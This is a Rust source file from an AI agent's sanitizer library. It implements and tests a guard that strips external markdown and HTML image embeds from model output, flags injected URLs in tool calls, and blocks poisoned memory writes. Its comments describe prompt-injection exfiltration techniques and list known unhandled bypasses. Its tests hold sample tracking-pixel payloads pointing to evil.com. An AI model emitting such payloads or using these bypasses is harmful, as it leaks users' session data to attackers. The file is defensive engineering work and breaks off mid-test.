// SPDX-FileCopyrightText: 2026 Andrei G <bug-ops>
// SPDX-License-Identifier: MIT OR Apache-2.0

//! Exfiltration guards: prevent LLM-generated content from leaking data via
//! outbound channels (markdown images, tool URL injection, poisoned memory writes).
//!
//! The [`ExfiltrationGuard`] is stateless and covers five attack vectors:
//!
//! 1. **Markdown image exfiltration** — an adversary plants `![t](https://evil.com/track.gif)`
//!    in content. When the LLM echoes it, the rendered image loads silently, leaking session data.
//!    [`ExfiltrationGuard::scan_output`] strips these and replaces them with `[image removed: …]`.
//!
//! 2. **URL injection via tool calls** — a flagged URL from untrusted tool output appears in a
//!    subsequent tool call argument. [`ExfiltrationGuard::validate_tool_call`] cross-references
//!    URLs against the per-turn flagged URL set. Flag-only approach (does not block execution).
//!
//! 3. **Poisoned memory writes** — content flagged with injection patterns is intercepted before
//!    Qdrant embedding. [`ExfiltrationGuard::should_guard_memory_write`] signals the caller to
//!    skip the embedding step, preventing poisoned content from polluting semantic search.
//!
//! 4. **HTML img tag exfiltration** — `<img src="https://evil.com/track.gif">` embeds are
//!    stripped alongside markdown images. Controlled by the same `block_markdown_images` flag.
//!
//! 5. **Unicode zero-width character bypass** — inserting zero-width joiners/non-joiners between
//!    `!` and `[` breaks naive markdown regex matchers. [`ExfiltrationGuard::scan_output`]
//!    detects and strips these sequences when `block_markdown_images` is enabled.

use std::collections::HashSet;
use std::fmt::Write as _;
use std::sync::LazyLock;

use regex::Regex;
use zeph_common::ToolName;

pub use zeph_config::ExfiltrationGuardConfig;

// ---------------------------------------------------------------------------
// Regex patterns
// ---------------------------------------------------------------------------

/// Matches inline markdown images with external http/https URLs:
/// `![alt text](https://example.com/track.gif)`
///
/// Local paths (`./img.png`) and data URIs (`data:image/...`) are intentionally
/// excluded — they cannot exfiltrate data to a remote server.
///
/// Per `CommonMark`, the destination may be preceded/followed by optional whitespace
/// and may be wrapped in angle brackets (`<https://...>`), which also permits
/// otherwise-illegal characters (e.g. spaces) inside the URL. Group 2 holds an
/// angle-bracket-wrapped URL, group 3 holds a bare URL — callers must check both.
///
/// An optional `CommonMark` title (`"..."`, `'...'`, or `(...)`) may follow the destination,
/// separated by whitespace — e.g. `![t](https://evil.com/x.gif "title")`. The bare-URL
/// branch stops at the first whitespace (so it cannot swallow a trailing title itself),
/// so the title clause must be matched explicitly or the whole pattern fails to match.
/// The double-quoted title branch also tolerates a backslash-escaped quote (`\"`) inside
/// the title without treating it as the closing delimiter, per `CommonMark` title parsing.
///
/// The scheme is matched case-insensitively (`(?i)`) and is optional — a scheme-relative
/// destination (`//evil.com/x.gif`) is treated the same as an explicit `https://` one, since
/// both resolve to an attacker-controlled origin when rendered.
static MARKDOWN_IMAGE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)!\[([^\]]*)\]\(\s*(?:<((?:https?:)?//[^>]+)>|((?:https?:)?//[^)\s]+))(?:\s+(?:"(?:\\.|[^"])*"|'[^']*'|\([^)]*\)))?\s*\)"#,
    )
    .expect("valid MARKDOWN_IMAGE_RE")
});

/// Matches reference-style markdown image declarations: `[ref]: https://example.com/img`
/// Used in conjunction with `REFERENCE_LABEL_RE` to detect two-part reference images.
///
/// The destination may be wrapped in angle brackets (`<https://...>`) per `CommonMark`.
/// Group 2 holds an angle-bracket-wrapped URL, group 3 holds a bare URL — callers must
/// check both.
///
/// The scheme is matched case-insensitively and is optional, so scheme-relative
/// destinations (`//evil.com/img`) are captured alongside explicit `https://` ones.
static REFERENCE_DEF_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?im)^\[([^\]]+)\]:\s*(?:<((?:https?:)?//[^>]+)>|((?:https?:)?//\S+))")
        .expect("valid REFERENCE_DEF_RE")
});

/// Matches reference-style image usages: `![alt][ref]`
static REFERENCE_USAGE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"!\[([^\]]*)\]\[([^\]]+)\]").expect("valid REFERENCE_USAGE_RE"));

/// Extracts http/https and scheme-relative URLs from arbitrary text (used for tool argument
/// scanning and untrusted-content flagging).
///
/// The scheme is matched case-insensitively and is optional, matching `is_external_url`'s
/// casing and scheme-relative rules (`//evil.com/x` resolves to the same attacker-controlled
/// origin as `https://evil.com/x`).
///
/// Matches from this regex must be passed through [`normalize_url_for_matching`] before being
/// inserted into or looked up in a `flagged_urls` set — see that function's doc comment for why.
static URL_EXTRACT_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?i)(?:https?:)?//[^\s"'<>]+"#).expect("valid URL_EXTRACT_RE"));

/// Matches HTML `<img>` tags with external http/https `src` attributes.
///
/// Single-quoted, double-quoted, and unquoted (HTML5-legal) `src` values are all matched.
/// Group 1 holds a quoted URL, group 2 holds an unquoted URL — callers must check both.
/// The full tag (`<img … >`) is replaced with `[image removed: <url>]`.
///
/// The `(?i)` flag also makes the scheme case-insensitive, and the scheme is optional so
/// scheme-relative `src` values (`//evil.com/track.gif`) are matched too — both are
/// HTML5-legal and render identically to an explicit `https://` URL.
static HTML_IMG_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)<img\b[^>]*\bsrc\s*=\s*(?:["']((?:https?:)?//[^"']+)["']|((?:https?:)?//[^\s>]+))[^>]*>"#,
    )
    .expect("valid HTML_IMG_RE")
});

/// Detects invisible Unicode characters between `!` and `[` used to bypass markdown regex.
///
/// Adversaries insert invisible formatting or combining characters between `!` and `[` to prevent
/// standard regex matchers from recognising the markdown image syntax. This pattern covers:
///
/// - `\p{Cf}` (Unicode Format category): zero-width joiners/non-joiners, BIDI overrides and
///   isolates (U+202A–202E, U+2066–2069), deprecated format chars (U+206A–206F), soft hyphen
///   (U+00AD), Mongolian vowel separator (U+180E), and the entire TAGS block (U+E0000–E007F).
/// - U+034F (COMBINING GRAPHEME JOINER, category Mn): invisible combining mark; not in `\p{Cf}`,
///   added explicitly.
static UNICODE_BYPASS_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"!(?:[\p{Cf}\x{034F}])+\[").expect("valid UNICODE_BYPASS_RE"));

// ---------------------------------------------------------------------------
// Event types
// ---------------------------------------------------------------------------

/// An exfiltration event detected by [`ExfiltrationGuard`].
///
/// Events are advisory: they are logged, counted, and returned to the caller for
/// further action. The guard itself never panics or blocks the agent loop.
///
/// # Examples
///
/// ```rust
/// use zeph_sanitizer::exfiltration::{ExfiltrationGuard, ExfiltrationEvent};
/// use zeph_config::ExfiltrationGuardConfig;
///
/// let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig::default());
/// let (cleaned, events) = guard.scan_output("![t](https://evil.com/pixel.gif)");
/// assert_eq!(events.len(), 1);
/// assert!(matches!(&events[0], ExfiltrationEvent::MarkdownImageBlocked { url } if url.contains("evil.com")));
/// ```
#[non_exhaustive]
#[derive(Debug, Clone, PartialEq)]
pub enum ExfiltrationEvent {
    /// A markdown image with an external URL was stripped from LLM output.
    MarkdownImageBlocked { url: String },
    /// An HTML `<img src="…">` tag with an external URL was stripped from LLM output.
    HtmlImageBlocked { url: String },
    /// A tool call argument contained a URL that appeared in untrusted flagged content.
    SuspiciousToolUrl { url: String, tool_name: ToolName },
    /// A memory write was intercepted because the content had injection flags.
    MemoryWriteGuarded { reason: String },
}

// ---------------------------------------------------------------------------
// Guard
// ---------------------------------------------------------------------------

/// Stateless exfiltration guard covering three outbound leak vectors.
///
/// Construct once from [`ExfiltrationGuardConfig`] and store on the agent. Cheap to clone.
/// All three scanners ([`scan_output`](Self::scan_output),
/// [`validate_tool_call`](Self::validate_tool_call),
/// [`should_guard_memory_write`](Self::should_guard_memory_write)) are independently
/// toggled via the config flags `block_markdown_images`, `validate_tool_urls`, and
/// `guard_memory_writes`.
///
/// # Examples
///
/// ```rust
/// use zeph_sanitizer::exfiltration::ExfiltrationGuard;
/// use zeph_config::ExfiltrationGuardConfig;
///
/// let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig::default());
///
/// // Strips external tracking pixels from LLM output.
/// let (cleaned, events) = guard.scan_output("text ![track](https://evil.com/p.gif) end");
/// assert!(events.len() == 1);
/// assert!(!cleaned.contains("![track]"));
///
/// // Memory write is guarded when injection flags are present.
/// let event = guard.should_guard_memory_write(true);
/// assert!(event.is_some());
/// ```
#[derive(Debug, Clone)]
pub struct ExfiltrationGuard {
    config: ExfiltrationGuardConfig,
}

impl ExfiltrationGuard {
    /// Create a new guard from the given configuration.
    ///
    /// # Examples
    ///
    /// ```rust
    /// use zeph_sanitizer::exfiltration::ExfiltrationGuard;
    /// use zeph_config::ExfiltrationGuardConfig;
    ///
    /// let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig::default());
    /// ```
    #[must_use]
    pub fn new(config: ExfiltrationGuardConfig) -> Self {
        Self { config }
    }

    /// Scan LLM output text and strip external markdown images.
    ///
    /// Returns the cleaned text and a list of [`ExfiltrationEvent::MarkdownImageBlocked`]
    /// for each image that was removed.
    ///
    /// When `block_markdown_images` is `false`, returns the input unchanged.
    ///
    /// # Scanning coverage
    /// - Inline images: `![alt](https://evil.com/track.gif)`, including `CommonMark`-legal
    ///   whitespace before the destination (`![alt]( https://...)`) and angle-bracket-wrapped
    ///   destinations (`![alt](<https://...>)`)
    /// - Reference-style images: `![alt][ref]` + `[ref]: https://evil.com/img`, including
    ///   angle-bracket-wrapped reference destinations (`[ref]: <https://...>`)
    /// - HTML `<img>` tags with quoted (`src="..."`, `src='...'`) or HTML5-legal unquoted
    ///   (`src=https://...`) `src` attributes
    /// - Percent-encoded URLs inside already-captured groups: decoded before `is_external_url()`
    /// - Case-insensitive schemes (`HTTPS://`, `Http://`) and scheme-relative destinations
    ///   (`//evil.com/track.gif`), which browsers and markdown renderers treat identically to
    ///   an explicit lowercase `https://` URL
    ///
    /// # Not covered (tracked in #1195)
    /// - Percent-encoded scheme bypass: `%68ttps://evil.com` — the regex requires literal
    ///   `https?://`, so a percent-encoded scheme is never captured. Fix requires pre-decoding
    ///   the full input text before regex matching.
    /// - Percent-encoded scheme-relative bypass: `%2f%2fevil.com/x.gif` decodes to `//evil.com/x.gif`
    ///   (a protocol-relative load), but the regex requires a literal `//` at the destination
    ///   start to capture at all, so it is never decoded or stripped. Same root cause and fix as
    ///   the percent-encoded scheme bypass above.
    /// - Reference definitions inside fenced code blocks (false positive risk)
    ///
    /// # Panics
    ///
    /// Panics if the compiled regex does not produce expected capture groups (compile-time
    /// guarantee — the regex patterns are validated via `expect` in `LazyLock` initializers).
    #[must_use]
    pub fn scan_output(&self, text: &str) -> (String, Vec<ExfiltrationEvent>) {
        if !self.config.block_markdown_images {
            return (text.to_owned(), vec![]);
        }

        let mut events = Vec::new();
        let mut result = text.to_owned();

        // --- Pass 1: inline images ---
        let mut replacement = String::new();
        let mut last_end = 0usize;
        for cap in MARKDOWN_IMAGE_RE.captures_iter(text) {
            let m = cap.get(0).expect("full match");
            let raw_url = cap
                .get(2)
                .or_else(|| cap.get(3))
                .expect("url group")
                .as_str();
            let url = percent_decode_url(raw_url);

            if is_external_url(&url) {
                replacement.push_str(&text[last_end..m.start()]);
                let _ = write!(replacement, "[image removed: {url}]");
                last_end = m.end();
                events.push(ExfiltrationEvent::MarkdownImageBlocked { url });
            }
        }
        if !events.is_empty() || last_end > 0 {
            replacement.push_str(&text[last_end..]);
            result = replacement;
        }

        // --- Pass 2: reference-style images ---
        // Collect reference definitions from the (already partially cleaned) result.
        let mut ref_defs: std::collections::HashMap<String, String> =
            std::collections::HashMap::new();
        for cap in REFERENCE_DEF_RE.captures_iter(&result) {
            let label = cap.get(1).expect("label").as_str().to_lowercase();
            let raw_url = cap.get(2).or_else(|| cap.get(3)).expect("url").as_str();
            let url = percent_decode_url(raw_url);
            if is_external_url(&url) {
                ref_defs.insert(label, url);
            }
        }

        if !ref_defs.is_empty() {
            // Remove reference usages that point to external defs.
            let mut cleaned = String::with_capacity(result.len());
            let mut last_end = 0usize;
            for cap in REFERENCE_USAGE_RE.captures_iter(&result) {
                let m = cap.get(0).expect("full match");
                let label = cap.get(2).expect("label").as_str().to_lowercase();
                if let Some(url) = ref_defs.get(&label) {
                    cleaned.push_str(&result[last_end..m.start()]);
                    let _ = write!(cleaned, "[image removed: {url}]");
                    last_end = m.end();
                    events.push(ExfiltrationEvent::MarkdownImageBlocked { url: url.clone() });
                }
            }
            cleaned.push_str(&result[last_end..]);
            result = cleaned;

            // Remove the reference definition lines for blocked refs.
            // Use split('\n') (not .lines()) to preserve \r in CRLF line endings —
            // .lines() strips \r, and reconstruction with push('\n') would silently
            // convert all CRLF to LF throughout the entire text.
            let mut def_cleaned = String::with_capacity(result.len());
            for line in result.split('\n') {
                let mut keep = true;
                for cap in REFERENCE_DEF_RE.captures_iter(line) {
                    let label = cap.get(1).expect("label").as_str().to_lowercase();
                    if ref_defs.contains_key(&label) {
                        keep = false;
                        break;
                    }
                }
                if keep {
                    def_cleaned.push_str(line);
                    def_cleaned.push('\n');
                }
            }
            // Preserve trailing newline behaviour of the original.
            if !text.ends_with('\n') && def_cleaned.ends_with('\n') {
                def_cleaned.pop();
            }
            result = def_cleaned;
        }

        // --- Pass 3: HTML img tags with external URLs ---
        let mut html_result = String::with_capacity(result.len());
        let mut html_last_end = 0usize;
        for cap in HTML_IMG_RE.captures_iter(&result) {
            let m = cap.get(0).expect("full match");
            let url = cap
                .get(1)
                .or_else(|| cap.get(2))
                .expect("src url group")
                .as_str()
                .to_owned();
            tracing::warn!(url = %url, "HTML img tag with external URL stripped from LLM output");
            html_result.push_str(&result[html_last_end..m.start()]);
            let _ = write!(html_result, "[image removed: {url}]");
            html_last_end = m.end();
            events.push(ExfiltrationEvent::HtmlImageBlocked { url });
        }
        if html_last_end > 0 {
            html_result.push_str(&result[html_last_end..]);
            result = html_result;
        }

        // --- Pass 4: Unicode zero-width bypass sequences ---
        // Adversaries insert zero-width chars between `!` and `[` to defeat markdown regexes.
        // Strip the entire `!<zwc+>[` sequence to defuse the payload.
        if UNICODE_BYPASS_RE.is_match(&result) {
            tracing::warn!("Unicode zero-width bypass attempt detected in LLM output; stripping");
            result = UNICODE_BYPASS_RE
                .replace_all(&result, "[blocked]")
                .into_owned();
        }

        (result, events)
    }

    /// Validate tool call arguments against a set of URLs flagged in untrusted content.
    ///
    /// Parses `args_json` as a JSON value and extracts all string leaves recursively to
    /// avoid JSON-encoding bypasses (escaped slashes, unicode escapes, etc.).
    ///
    /// Returns one [`ExfiltrationEvent::SuspiciousToolUrl`] per matching URL.
    /// When `validate_tool_urls` is `false`, always returns an empty vec.
    ///
    /// # Flag-only approach
    /// Matching URLs are logged and counted but tool execution is NOT blocked. Blocking
    /// would break legitimate workflows where the same URL appears in both a search result
    /// and a subsequent fetch call. See design decision D1 in the architect handoff.
    #[must_use]
    pub fn validate_tool_call(
        &self,
        tool_name: &str,
        args_json: &str,
        flagged_urls: &HashSet<String>,
    ) -> Vec<ExfiltrationEvent> {
        if !self.config.validate_tool_urls || flagged_urls.is_empty() {
            return vec![];
        }

        let parsed: serde_json::Value = match serde_json::from_str(args_json) {
            Ok(v) => v,
            Err(_) => {
                // Fall back to raw regex scan if JSON is malformed.
                return Self::scan_raw_args(tool_name, args_json, flagged_urls);
            }
        };

        let mut events = Vec::new();
        let mut strings = Vec::new();
        collect_strings(&parsed, &mut strings, 0);

        for s in &strings {
            for url_match in URL_EXTRACT_RE.find_iter(s) {
                let url = url_match.as_str();
                if flagged_urls.contains(normalize_url_for_matching(url)) {
                    events.push(ExfiltrationEvent::SuspiciousToolUrl {
                        url: url.to_owned(),
                        tool_name: tool_name.into(),
                    });
                }
            }
        }

        events
    }

    /// Check whether a memory write should skip Qdrant embedding.
    ///
    /// Returns `Some(MemoryWriteGuarded)` when `has_injection_flags` is `true` and
    /// `guard_memory_writes` is enabled. The caller should still save to `SQLite` for
    /// conversation continuity but omit the Qdrant embedding to prevent poisoned content
    /// from polluting semantic search results.
    ///
    /// See design decision D2 in the architect handoff.
    #[must_use]
    pub fn should_guard_memory_write(
        &self,
        has_injection_flags: bool,
    ) -> Option<ExfiltrationEvent> {
        if !self.config.guard_memory_writes || !has_injection_flags {
            return None;
        }
        Some(ExfiltrationEvent::MemoryWriteGuarded {
            reason: "content contained injection patterns flagged by ContentSanitizer".to_owned(),
        })
    }

    /// Extract URLs from untrusted tool output for use in subsequent `validate_tool_call` checks.
    ///
    fn scan_raw_args(
        tool_name: &str,
        args: &str,
        flagged_urls: &HashSet<String>,
    ) -> Vec<ExfiltrationEvent> {
        URL_EXTRACT_RE
            .find_iter(args)
            .filter(|m| flagged_urls.contains(normalize_url_for_matching(m.as_str())))
            .map(|m| ExfiltrationEvent::SuspiciousToolUrl {
                url: m.as_str().to_owned(),
                tool_name: tool_name.into(),
            })
            .collect()
    }
}

/// Extract all `http`/`https` URLs from `content` into a `HashSet` for later URL validation.
///
/// Call this after sanitizing untrusted tool output with `ContentSanitizer` when injection
/// flags are present. Pass the returned set into the agent's `flagged_urls` field. Pass that
/// set to [`ExfiltrationGuard::validate_tool_call`] on each subsequent tool call. Clear
/// `flagged_urls` at the start of each `process_response` call (per-turn clearing strategy).
///
/// Returns the **raw**, non-normalized matched text — including scheme-relative matches
/// (`//host/path`) alongside explicit-scheme ones. This function has more than one consumer
/// (e.g. `zeph-core` also feeds its output into `user_provided_urls` for URL-grounding checks,
/// which must compare against the exact text the user or tool output supplied), so it must not
/// silently rewrite its callers' text.
///
/// Callers that build an exact-string matching set from this output — like the `flagged_urls`
/// set consumed by [`ExfiltrationGuard::validate_tool_call`] — must normalize each entry
/// themselves via [`normalize_url_for_matching`] before inserting it, so that an explicit-scheme
/// URL and its scheme-relative equivalent collapse into a single, matchable entry. See that
/// function's doc comment for why this matters.
///
/// # Examples
///
/// ```rust
/// use zeph_sanitizer::exfiltration::extract_flagged_urls;
///
/// let urls = extract_flagged_urls("visit https://evil.com/x and //other.com/y");
/// assert!(urls.contains("https://evil.com/x"));
/// assert!(urls.contains("//other.com/y"));
/// assert_eq!(urls.len(), 2);
/// ```
#[must_use]
pub fn extract_flagged_urls(content: &str) -> HashSet<String> {
    URL_EXTRACT_RE
        .find_iter(content)
        .map(|m| m.as_str().to_owned())
        .collect()
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Decode percent-encoded URL characters before exfiltration matching.
///
/// Converts `%68ttps://` → `https://` so simple percent-encoding bypasses are caught.
/// Non-UTF-8 sequences are left as-is (they won't match `is_external_url`).
fn percent_decode_url(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    let bytes = raw.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%'
            && i + 2 < bytes.len()
            && let (Some(hi), Some(lo)) = (
                (bytes[i + 1] as char).to_digit(16),
                (bytes[i + 2] as char).to_digit(16),
            )
        {
            // hi and lo are 0-15; combined value is at most 0xFF, fits in u8.
            #[allow(clippy::cast_possible_truncation)]
            let byte = ((hi << 4) | lo) as u8;
            out.push(byte as char);
            i += 3;
            continue;
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

/// A URL is external if it names an `http`/`https` scheme (case-insensitively) or is
/// scheme-relative (`//host/path`) — the latter inherits the page's scheme at render time
/// and resolves to the same attacker-controlled origin as an explicit `https://` URL.
fn is_external_url(url: &str) -> bool {
    url.starts_with("//")
        || url
            .get(..8)
            .is_some_and(|s| s.eq_ignore_ascii_case("https://"))
        || url
            .get(..7)
            .is_some_and(|s| s.eq_ignore_ascii_case("http://"))
}

/// Normalize a URL to a canonical scheme-relative form (`//host/path`) for exact-string
/// `flagged_urls`-style set membership.
///
/// `URL_EXTRACT_RE` (used by [`extract_flagged_urls`] and
/// [`ExfiltrationGuard::validate_tool_call`]) matches both explicit-scheme (`https://…`) and
/// scheme-relative (`//…`) URLs, since both resolve to the same attacker-controlled origin (see
/// `is_external_url`). But a `flagged_urls` set built from those matches does exact-string
/// comparison: without normalization, the same origin captured in one textual form (e.g.
/// `//evil.com/x` extracted from untrusted tool output) would never match its occurrence in the
/// other form (e.g. `https://evil.com/x` in a later tool-call argument) — silently defeating the
/// cross-reference check the set exists for. Stripping any `http://`/`https://` prefix down to
/// `//host/path` makes both forms compare equal, while an already scheme-relative URL passes
/// through untouched.
///
/// [`extract_flagged_urls`] itself returns raw, non-normalized text (some of its callers need
/// exact text fidelity — e.g. URL-grounding checks against user-supplied input — and must not
/// have their strings silently rewritten). Callers building a `flagged_urls`-style matching set
/// from that raw output must apply this function to every entry before inserting it, and to
/// every URL looked up against that set. The *raw*, non-normalized match text should still be
/// used for reporting (see [`ExfiltrationEvent::SuspiciousToolUrl`]).
///
/// # Examples
///
/// ```rust
/// use zeph_sanitizer::exfiltration::{extract_flagged_urls, normalize_url_for_matching};
/// use std::collections::HashSet;
///
/// assert_eq!(normalize_url_for_matching("https://evil.com/x"), "//evil.com/x");
/// assert_eq!(normalize_url_for_matching("HTTPS://evil.com/x"), "//evil.com/x");
/// assert_eq!(normalize_url_for_matching("//evil.com/x"), "//evil.com/x");
///
/// // Building a `flagged_urls`-style set from raw `extract_flagged_urls` output: both textual
/// // forms of the same origin collapse into a single matchable entry.
/// let raw = extract_flagged_urls("https://evil.com/x and //evil.com/x again");
/// let flagged: HashSet<String> = raw
///     .iter()
///     .map(|u| normalize_url_for_matching(u).to_owned())
///     .collect();
/// assert_eq!(flagged.len(), 1);
/// assert!(flagged.contains("//evil.com/x"));
/// ```
#[must_use]
pub fn normalize_url_for_matching(url: &str) -> &str {
    if url
        .get(..8)
        .is_some_and(|s| s.eq_ignore_ascii_case("https://"))
    {
        &url[6..]
    } else if url
        .get(..7)
        .is_some_and(|s| s.eq_ignore_ascii_case("http://"))
    {
        &url[5..]
    } else {
        url
    }
}

/// Maximum JSON nesting depth walked by [`collect_strings`].
///
/// Guards against stack overflow on adversarially deep tool-call input (e.g. from
/// prompt-injected LLM output). Beyond this depth, further descent is simply skipped —
/// URL detection just misses strings past the bound rather than crashing.
const MAX_JSON_DEPTH: usize = 256;

/// Recursively collect all string leaves from a JSON value.
fn collect_strings<'a>(value: &'a serde_json::Value, out: &mut Vec<&'a str>, depth: usize) {
    if depth >= MAX_JSON_DEPTH {
        tracing::warn!(
            depth,
            "collect_strings: max JSON nesting depth reached, skipping further descent"
        );
        return;
    }
    match value {
        serde_json::Value::String(s) => out.push(s.as_str()),
        serde_json::Value::Array(arr) => {
            for v in arr {
                collect_strings(v, out, depth + 1);
            }
        }
        serde_json::Value::Object(map) => {
            for v in map.values() {
                collect_strings(v, out, depth + 1);
            }
        }
        _ => {}
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use std::assert_matches;

    fn guard() -> ExfiltrationGuard {
        ExfiltrationGuard::new(ExfiltrationGuardConfig::default())
    }

    fn guard_disabled() -> ExfiltrationGuard {
        ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: false,
            validate_tool_urls: false,
            guard_memory_writes: false,
        })
    }

    /// Build a `flagged_urls`-style matching set from raw text, mirroring what a
    /// `flagged_urls`-specific caller (e.g. `zeph-core`'s tool-output pipeline) does with
    /// `extract_flagged_urls`'s raw output: normalize every entry via
    /// `normalize_url_for_matching` before insertion. `extract_flagged_urls` itself does NOT
    /// normalize — see its doc comment — so tests exercising cross-form matching must build
    /// the set this way rather than inserting raw literals or the unmodified
    /// `extract_flagged_urls` return value.
    fn build_flagged_set(text: &str) -> HashSet<String> {
        extract_flagged_urls(text)
            .iter()
            .map(|u| normalize_url_for_matching(u).to_owned())
            .collect()
    }

    // --- scan_output ---

    #[test]
    fn strips_external_inline_image() {
        let (cleaned, events) =
            guard().scan_output("Before ![track](https://evil.com/p.gif) after");
        assert_eq!(
            cleaned,
            "Before [image removed: https://evil.com/p.gif] after"
        );
        assert_eq!(events.len(), 1);
        assert!(
            matches!(&events[0], ExfiltrationEvent::MarkdownImageBlocked { url } if url == "https://evil.com/p.gif")
        );
    }

    #[test]
    fn preserves_local_image() {
        let text = "Look: ![diagram](./diagram.png) — local";
        let (cleaned, events) = guard().scan_output(text);
        assert_eq!(cleaned, text);
        assert!(events.is_empty());
    }

    #[test]
    fn preserves_data_uri() {
        let text = "Inline: ![icon](data:image/png;base64,abc123)";
        let (cleaned, events) = guard().scan_output(text);
        assert_eq!(cleaned, text);
        assert!(events.is_empty());
    }

    #[test]
    fn strips_multiple_external_images() {
        let text = "![a](https://a.com/1.gif) text ![b](https://b.com/2.gif)";
        let (cleaned, events) = guard().scan_output(text);
        // Markdown image syntax must be removed; replacement label may contain URLs.
        assert!(
            !cleaned.contains("![a]("),
            "first image syntax must be removed: {cleaned}"
        );
        assert!(
            !cleaned.contains("![b]("),
            "second image syntax must be removed: {cleaned}"
        );
        assert_eq!(events.len(), 2);
    }

    #[test]
    fn scan_output_noop_when_disabled() {
        let text = "![track](https://evil.com/p.gif)";
        let (cleaned, events) = guard_disabled().scan_output(text);
        assert_eq!(cleaned, text);
        assert!(events.is_empty());
    }

    #[test]
    fn strips_reference_style_image() {
        let text = "Here is the image: ![alt][ref]\n[ref]: https://evil.com/track.gif\nend";
        let (cleaned, events) = guard().scan_output(text);
        // The markdown image syntax and definition line must be removed.
        assert!(
            !cleaned.contains("![alt][ref]"),
            "image usage syntax must be removed: {cleaned}"
        );
        assert!(
            !cleaned.contains("[ref]:"),
            "reference definition must be removed: {cleaned}"
        );
        assert!(
            cleaned.contains("[image removed:"),
            "replacement label must be present: {cleaned}"
        );
        assert!(!events.is_empty(), "must generate event");
    }

    #[test]
    fn preserves_local_reference_image() {
        // Reference pointing to a local path — must not be stripped.
        let text = "![alt][ref]\n[ref]: ./local.png\n";
        let (cleaned, events) = guard().scan_output(text);
        assert_eq!(cleaned, text);
        assert!(events.is_empty());
    }

    #[test]
    fn decodes_percent_encoded_url_in_inline_image() {
        // %68 = 'h', so %68ttps:// decodes to https://.
        // The MARKDOWN_IMAGE_RE pattern requires a literal `https?://` prefix, so
        // `%68ttps://` is NOT matched by the regex and passes through unchanged.
        // percent_decode_url() is called on the URL *after* the regex captures it —
        // so percent-encoded schemes bypass inline detection.
        //
        // Known bypass — tracked for Phase 5 (#1195): the fix requires pre-decoding the
        // full text before regex matching (or a multi-pass decode+scan approach). The LLM
        // context wrapper already limits what arrives here, reducing practical risk.
        let text = "![t](%68ttps://evil.com/track.gif)";
        let (cleaned, _events) = guard().scan_output(text);
        // The text passes through unchanged because the regex didn't match.
        assert_eq!(
            cleaned, text,
            "percent-encoded scheme not detected by inline regex"
        );

        // A normal https:// URL IS detected.
        let normal = "![t](https://evil.com/track.gif)";
        let (normal_cleaned, normal_events) = guard().scan_output(normal);
        assert!(
            !normal_cleaned.contains("![t](https://"),
            "normal URL must be removed"
        );
        assert_eq!(normal_events.len(), 1);
    }

    #[test]
    fn strips_inline_image_with_leading_whitespace_in_destination() {
        // CommonMark permits optional whitespace between `(` and the destination.
        let (cleaned, events) =
            guard().scan_output("Before ![t]( https://evil.com/pixel.gif) after");
        assert!(
            !cleaned.contains("![t]("),
            "markdown image syntax must be removed: {cleaned}"
        );
        assert!(
            cleaned.contains("[image removed: https://evil.com/pixel.gif]"),
            "replacement label must contain the url: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn strips_inline_image_with_angle_bracket_destination() {
        // CommonMark permits wrapping the destination in angle brackets.
        let (cleaned, events) =
            guard().scan_output("Before ![t](<https://evil.com/pixel.gif>) after");
        assert!(
            !cleaned.contains("![t]("),
            "markdown image syntax must be removed: {cleaned}"
        );
        assert!(
            cleaned.contains("[image removed: https://evil.com/pixel.gif]"),
            "replacement label must contain the url: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn strips_inline_image_with_double_quoted_title() {
        // Standard CommonMark image title syntax: `![alt](url "title")`.
        let (cleaned, events) =
            guard().scan_output(r#"Before ![t](https://evil.com/x.gif "title") after"#);
        assert!(
            !cleaned.contains("![t]("),
            "markdown image syntax must be removed: {cleaned}"
        );
        assert!(
            cleaned.contains("[image removed: https://evil.com/x.gif]"),
            "replacement label must contain the url without the title: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn strips_inline_image_with_single_quoted_title() {
        let (cleaned, events) =
            guard().scan_output("Before ![t](https://evil.com/x.gif 'title') after");
        assert!(
            !cleaned.contains("![t]("),
            "markdown image syntax must be removed: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn strips_inline_image_with_paren_title() {
        let (cleaned, events) =
            guard().scan_output("Before ![t](https://evil.com/x.gif (title)) after");
        assert!(
            !cleaned.contains("![t]("),
            "markdown image syntax must be removed: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn strips_inline_image_with_leading_whitespace_and_title() {
        let (cleaned, events) =
            guard().scan_output(r#"Before ![t]( https://evil.com/x.gif "title") after"#);
        assert!(
            !cleaned.contains("![t]("),
            "markdown image syntax must be removed: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn strips_inline_image_with_angle_bracket_destination_and_title() {
        let (cleaned, events) =
            guard().scan_output(r#"Before ![t](<https://evil.com/x.gif> "title") after"#);
        assert!(
            !cleaned.contains("![t]("),
            "markdown image syntax must be removed: {cleaned}"
        );
        assert!(
            cleaned.contains("[image removed: https://evil.com/x.gif]"),
            "replacement label must contain the url without the title: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn strips_reference_style_image_with_angle_bracket_destination() {
        let text = "Here is the image: ![alt][ref]\n[ref]: <https://evil.com/track.gif>\nend";
        let (cleaned, events) = guard().scan_output(text);
        assert!(
            !cleaned.contains("![alt][ref]"),
